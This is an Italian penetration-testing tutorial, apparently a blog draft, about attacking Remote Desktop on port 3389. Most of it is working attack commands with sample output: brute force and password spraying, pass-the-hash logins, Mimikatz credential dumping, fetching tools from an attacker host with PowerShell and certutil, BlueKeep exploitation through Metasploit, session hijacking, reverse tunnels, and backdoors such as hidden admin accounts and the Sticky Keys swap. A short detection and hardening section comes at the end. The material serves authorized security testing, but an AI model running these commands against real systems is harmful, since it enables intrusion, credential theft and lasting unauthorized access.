---
title: 'Porta 3389 RDP: cos’è il Remote Desktop, come funziona e rischi di sicurezza'
slug: porta-3389-rdp
description: 'Scopri a cosa serve la porta 3389 RDP, come funzionano Remote Desktop, NLA e CredSSP, quali rischi introduce l’esposizione del servizio e come si attaccano o difendono brute force, BlueKeep e lateral movement.'
image: /porta-3389-rdp.webp
draft: true
date: 2026-04-03T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - rdp
  - bluekeep
---

RDP è il protocollo di accesso remoto desktop sviluppato da Microsoft, attivo di default sulla porta 3389 TCP/UDP. È il metodo standard per amministrare server Windows e per lo smart working aziendale. Nel penetration testing, RDP è un target primario per diverse ragioni: fornisce una sessione grafica completa (equivalente a sedersi davanti al computer), è esposto su Internet molto più spesso di quanto dovrebbe (oltre 4 milioni di istanze RDP esposte pubblicamente nel 2025), ha avuto vulnerabilità critiche di pre-authentication RCE (BlueKeep) ed è il vettore preferito per il brute force delle credenziali Windows. Una volta dentro via RDP, hai accesso completo al desktop: puoi lanciare [Mimikatz](https://hackita.it/articoli/mimikatz) per estrarre credenziali, accedere a share di rete, e muoverti lateralmente verso il [Domain Controller](https://hackita.it/articoli/dcsync).

RDP è anche il protocollo più usato dai ransomware gang per l'accesso iniziale: credenziali RDP deboli comprate sui marketplace del dark web sono il vettore #1 per gli attacchi ransomware dal 2019 a oggi.

## Come Funziona RDP

```
Client RDP                           Server Windows (:3389)
┌──────────────┐                     ┌────────────────────────┐
│ mstsc.exe    │                     │  Terminal Services     │
│ rdesktop     │ ── TLS/CredSSP ──► │  (RDP-Tcp listener)    │
│ xfreerdp     │                     │                        │
│ remmina      │ ◄── desktop ──────  │  Sessione interattiva  │
└──────────────┘                     │  (come se fossi lì)    │
                                     └────────────────────────┘
```

RDP supporta due livelli di sicurezza:

* **NLA (Network Level Authentication)**: l'utente si autentica PRIMA di creare la sessione grafica (CredSSP). Blocca BlueKeep e riduce la superficie di attacco
* **Standard RDP Security**: la sessione viene creata prima dell'autenticazione — più vulnerabile

## 1. Enumerazione

### Nmap

```bash
nmap -sV -p 3389 --script=rdp-ntlm-info,rdp-enum-encryption 10.10.10.40
```

```
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: CORP
|   NetBIOS_Domain_Name: CORP
|   NetBIOS_Computer_Name: WS-01
|   DNS_Domain_Name: corp.local
|   DNS_Computer_Name: WS-01.corp.local
|   Product_Version: 10.0.19041
| rdp-enum-encryption:
|   Security layer
|     CredSSP (NLA): SUCCESS
|     Native RDP: SUCCESS
|   RDP Encryption level: High
```

**Intelligence critica dal NTLM info:**

* **CORP** → nome del dominio Active Directory
* **WS-01.corp.local** → FQDN della macchina → conferma che è in dominio
* **Product\_Version 10.0.19041** → Windows 10/Server 2019 build 19041
* **NLA: SUCCESS** → NLA è supportato (ma non necessariamente obbligatorio)

### Verifica se NLA è obbligatorio

```bash
nmap -p 3389 --script=rdp-enum-encryption 10.10.10.40
```

Se `Native RDP: SUCCESS` e `CredSSP (NLA): SUCCESS` → il server accetta entrambi i metodi. Se solo CredSSP → NLA è obbligatorio.

### Screenshot RDP (senza credenziali)

```bash
# rdp-sec-check
rdp-sec-check 10.10.10.40:3389
```

## 2. Credential Attack

### Brute force con Hydra

```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt 10.10.10.40 rdp -t 4 -W 5
```

`-t 4` limita i thread (RDP è lento) e `-W 5` aspetta 5 secondi tra tentativi per evitare il lockout.

### Brute force con Crowbar

Crowbar è specificamente progettato per RDP:

```bash
crowbar -b rdp -s 10.10.10.40/32 -u admin -C passwords.txt -n 1
```

### Password spray

```bash
# Testa una password su molti utenti (evita lockout)
crowbar -b rdp -s 10.10.10.0/24 -U users.txt -c 'Corp2026!' -n 1
```

```bash
# Con crackmapexec
crackmapexec rdp 10.10.10.0/24 -u users.txt -p 'Corp2026!'
```

```
RDP    10.10.10.40  3389  WS-01   [+] CORP\j.smith:Corp2026! (Pwn3d!)
```

`(Pwn3d!)` significa che l'utente ha i permessi per accedere via RDP (membro di Remote Desktop Users o Administrators).

### Credenziali da altre fonti

Le credenziali per RDP sono credenziali Windows — se le trovi altrove, funzionano:

* [Mimikatz](https://hackita.it/articoli/mimikatz) da un'altra macchina → hash NTLM o password in chiaro
* [DCSync](https://hackita.it/articoli/dcsync) → hash di qualsiasi utente
* [Kerberoasting](https://hackita.it/articoli/active-directory) → password di service account
* Database dump → credential reuse

## 3. Connessione RDP

### Con credenziali

```bash
# xfreerdp (Linux — il più usato)
xfreerdp /v:10.10.10.40 /u:j.smith /p:'Corp2026!' /d:CORP /cert:ignore
```

```bash
# Con hash NTLM (Pass-the-Hash via RDP)
xfreerdp /v:10.10.10.40 /u:administrator /pth:64f12cddaa88057e06a81b54e73b949b /d:CORP /cert:ignore
```

**Pass-the-Hash via RDP** richiede che il target abbia "Restricted Admin Mode" abilitato. Se non è abilitato:

```
# Sul target (se hai già accesso):
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```bash
# rdesktop (alternativa)
rdesktop -u j.smith -p 'Corp2026!' -d CORP 10.10.10.40
```

```bash
# Da Windows
mstsc /v:10.10.10.40
```

### Opzioni utili xfreerdp

```bash
# Condividi una directory locale (utile per trasferire tool)
xfreerdp /v:10.10.10.40 /u:admin /p:pass /d:CORP /cert:ignore /drive:share,/tmp/tools

# Dimensione finestra
xfreerdp /v:10.10.10.40 /u:admin /p:pass /size:1920x1080 /cert:ignore

# Admin mode (console session)
xfreerdp /v:10.10.10.40 /u:admin /p:pass /admin /cert:ignore
```

## 4. Post-Authentication — Cosa Fare con una Sessione RDP

### Mimikatz — Credential Extraction

Con una sessione RDP come administrator locale:

```
mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

Estrae password in chiaro e hash NTLM di tutti gli utenti che hanno fatto login sulla macchina. Per la [guida Mimikatz completa](https://hackita.it/articoli/mimikatz).

### Trasferire tool

```bash
# Via shared drive (se hai usato /drive)
# I file appaiono in \\tsclient\share\ nella sessione RDP

# Via PowerShell (dal target)
powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.10.200/mimikatz.exe','C:\temp\m.exe')"

# Via certutil (LoLBin)
certutil -urlcache -split -f http://10.10.10.200/mimikatz.exe C:\temp\m.exe
```

### Enumerazione locale

```powershell
# Utente e privilegi
whoami /all

# Utenti locali
net user

# Gruppi amministratori
net localgroup Administrators

# Info dominio
systeminfo | findstr Domain
net user /domain

# Sessioni attive (altri utenti connessi)
query user
```

```
 USERNAME    SESSIONNAME   ID  STATE   IDLE TIME  LOGON TIME
>j.smith     rdp-tcp#0      1  Active         .   1/15/2026 10:00
 admin       rdp-tcp#1      2  Disc          5    1/15/2026 09:00
```

`admin` ha una sessione disconnessa — i suoi token e credenziali sono ancora in memoria. [Mimikatz](https://hackita.it/articoli/mimikatz) li può estrarre.

### Session Hijacking

Se sei SYSTEM, puoi prendere il controllo della sessione di un altro utente senza conoscere la password:

```
# Diventa SYSTEM
psexec -s -i cmd.exe

# Prendi la sessione dell'utente admin (session ID 2)
tscon 2 /dest:console
```

Oppure con Mimikatz:

```
mimikatz # ts::sessions
mimikatz # token::elevate
mimikatz # ts::remote /id:2
```

Ti trovi nella sessione desktop di `admin` — vedi il suo desktop, le sue applicazioni aperte, i suoi file.

## 5. BlueKeep e Vulnerabilità RDP

### CVE-2019-0708 — BlueKeep

Pre-authentication RCE su sistemi non patchati: Windows 7, Windows Server 2008/2008 R2, Windows XP, Windows Vista. **Non richiede credenziali.**

```bash
# Verifica vulnerabilità
nmap -p 3389 --script=rdp-vuln-ms12-020 10.10.10.40
```

```bash
# Scanner BlueKeep
msfconsole -q
msf6 > use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
msf6 > set RHOSTS 10.10.10.40
msf6 > run
```

```
[+] 10.10.10.40:3389 - The target is vulnerable.
```

```bash
# Exploitation
msf6 > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
msf6 > set RHOSTS 10.10.10.40
msf6 > set TARGET 2  # Scegli il target OS corretto
msf6 > run
```

**Attenzione:** l'exploit BlueKeep può causare BSOD. Testa con cautela e solo con autorizzazione esplicita.

### CVE-2019-1181/1182 — DejaBlue

Simile a BlueKeep ma colpisce versioni più recenti: Windows 10, Server 2019. Meno exploit pubblici ma la vulnerabilità è confermata.

### CVE-2012-0002 — MS12-020

DoS via RDP — crash del servizio. Non dà accesso ma conferma che il servizio è vulnerabile.

## 6. RDP nel Lateral Movement

### Con crackmapexec

```bash
# Testa credenziali su tutta la subnet via RDP
crackmapexec rdp 10.10.10.0/24 -u administrator -H 64f12cddaa88057e06a81b54e73b949b
```

```
RDP  10.10.10.40  3389  WS-01   [+] CORP\administrator:hash (Pwn3d!)
RDP  10.10.10.41  3389  WS-02   [+] CORP\administrator:hash (Pwn3d!)
RDP  10.10.10.50  3389  SRV-01  [+] CORP\administrator:hash (Pwn3d!)
```

Hash dell'administrator funziona su 3 macchine — local admin password identica (immagine clonata, niente [LAPS](https://hackita.it/articoli/active-directory)).

### RDP → Mimikatz → Hash DA → DCSync

```
1. RDP su workstation come admin locale
2. Mimikatz → sekurlsa::logonpasswords → trova hash Domain Admin
3. DCSync dal DC → hash krbtgt → Golden Ticket
4. Dominio compromesso
```

Questo è il percorso classico di escalation in Active Directory tramite RDP. Per il [DCSync completo](https://hackita.it/articoli/dcsync).

### RDP + Port Forwarding

Se hai accesso RDP a una macchina nella rete interna, puoi usarla come pivot:

```bash
# SSH tunnel attraverso la macchina con RDP
# (se SSH è disponibile sulla macchina)
ssh -L 3306:db-internal.corp.local:3306 admin@10.10.10.40

# Oppure chisel per tunnel via RDP
# Upload chisel.exe sulla macchina target
# Sul target: chisel.exe client 10.10.10.200:8080 R:socks
# Sul tuo host: chisel server -p 8080 --reverse
```

## 7. Persistence via RDP

### Abilitare RDP (se disabilitato)

```powershell
# Via registry
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Apri il firewall
netsh advfirewall firewall set rule group="Remote Desktop" new enable=yes

# Aggiungi utente al gruppo Remote Desktop Users
net localgroup "Remote Desktop Users" backdoor /add
```

### Creare un utente nascosto

```powershell
# Crea utente
net user backdoor$ P@ssw0rd123! /add

# Il $ alla fine nasconde l'utente da "net user"
# Aggiungi ai gruppi
net localgroup Administrators backdoor$ /add
net localgroup "Remote Desktop Users" backdoor$ /add
```

### Sticky Keys Backdoor

Sostituisci `sethc.exe` (Sticky Keys) con `cmd.exe`. Alla schermata di login, premi Shift 5 volte → ottieni una command prompt come SYSTEM.

```powershell
# Backup e sostituzione
copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc.exe.bak
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe /Y
```

Funziona anche sulla schermata di login pre-autenticazione — shell SYSTEM senza credenziali.

## 8. Raccogliere Credenziali RDP Salvate

### Sul client (macchina da cui ci si connette)

```powershell
# Credenziali RDP salvate in Credential Manager
cmdkey /list
```

```
Target: TERMSRV/10.10.10.40
User: CORP\admin
```

Le credenziali RDP salvate sono decriptabili con [Mimikatz DPAPI](https://hackita.it/articoli/mimikatz):

```
mimikatz # vault::cred
```

### File .rdp

```powershell
# Cerca file .rdp con credenziali salvate
dir C:\Users\*\Documents\*.rdp /s
dir C:\Users\*\Desktop\*.rdp /s
```

I file `.rdp` possono contenere username e, raramente, password criptate.

## 9. Detection & Hardening

### Blue Team

| Indicatore         | Event ID         | Descrizione                    |
| ------------------ | ---------------- | ------------------------------ |
| Login RDP riuscito | **4624** Type 10 | RemoteInteractive logon        |
| Login RDP fallito  | **4625** Type 10 | Brute force indicator          |
| Session hijacking  | **4778**         | Session reconnected            |
| NLA failure        | **6273**         | CredSSP authentication failure |

### Hardening

* **NLA obbligatorio** — `Require Network Level Authentication` nelle Group Policy
* **Non esporre RDP su Internet** — usa VPN o jump host
* **Account lockout policy** — 5 tentativi, lockout 30 minuti
* **MFA per RDP** — Duo, Azure MFA, o altre soluzioni
* **LAPS** — password administrator locali uniche per ogni macchina
* **Restricted Admin Mode** disabilitato (impedisce PtH via RDP)
* **Firewall** — porta 3389 raggiungibile solo da IP autorizzati
* **Patch** — BlueKeep e DejaBlue sono del 2019, ma sistemi non patchati esistono ancora
* **Remote Desktop Gateway** — centralizza l'accesso RDP con TLS e audit

## 10. Cheat Sheet Finale

| Azione              | Comando                                                              |
| ------------------- | -------------------------------------------------------------------- |
| Nmap                | `nmap -sV -p 3389 --script=rdp-ntlm-info,rdp-enum-encryption target` |
| BlueKeep scan       | `msfconsole → use auxiliary/scanner/rdp/cve_2019_0708_bluekeep`      |
| Brute force         | `crowbar -b rdp -s target/32 -u admin -C wordlist -n 1`              |
| Password spray      | `crackmapexec rdp subnet -u users.txt -p 'Corp2026!'`                |
| Connect (password)  | `xfreerdp /v:target /u:user /p:pass /d:DOMAIN /cert:ignore`          |
| Connect (PtH)       | `xfreerdp /v:target /u:admin /pth:HASH /cert:ignore`                 |
| Share locale        | `xfreerdp ... /drive:share,/tmp/tools`                               |
| Session hijack      | `tscon SESSION_ID /dest:console` (come SYSTEM)                       |
| Enable RDP          | `reg add "HKLM\...\Terminal Server" /v fDenyTSConnections /d 0`      |
| Sticky Keys         | `copy cmd.exe sethc.exe`                                             |
| Credenziali salvate | `cmdkey /list` o `mimikatz # vault::cred`                            |

***

Riferimento: Microsoft RDP documentation, BlueKeep CVE-2019-0708, MITRE ATT\&CK T1021.001, HackTricks RDP. Uso esclusivo in ambienti autorizzati.

> [hackita.it/supporto](https://hackita.it/supporto) — [hackita.it/servizi](https://hackita.it/servizi).
